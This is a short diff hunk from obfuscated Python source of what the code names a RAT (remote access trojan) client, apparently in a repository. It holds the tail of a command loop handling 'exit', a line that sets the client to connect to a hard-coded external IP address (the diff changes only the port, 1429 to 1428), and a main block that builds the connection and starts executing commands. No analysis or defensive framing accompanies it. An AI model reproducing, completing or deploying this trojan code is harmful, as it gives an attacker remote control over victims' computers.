@@ -532,7 +532,7 @@ User: {os.getlogin()}
             elif O00O0OO000O0000O0 =='exit':#line:618:elif command == 'exit':
                 s .send (b"exit")#line:619:s.send(b"exit")
                 break #line:620:break
-rat =RAT_CLIENT ('141.255.152.22',1429)#line:622:rat = RAT_CLIENT('141.255.156.196', 1435)
+rat =RAT_CLIENT ('141.255.152.22',1428)#line:622:rat = RAT_CLIENT('141.255.156.196', 1435)
 if __name__ =='__main__':#line:624:if __name__ == '__main__':
     rat .build_connection ()#line:625:rat.build_connection()
     rat .execute ()
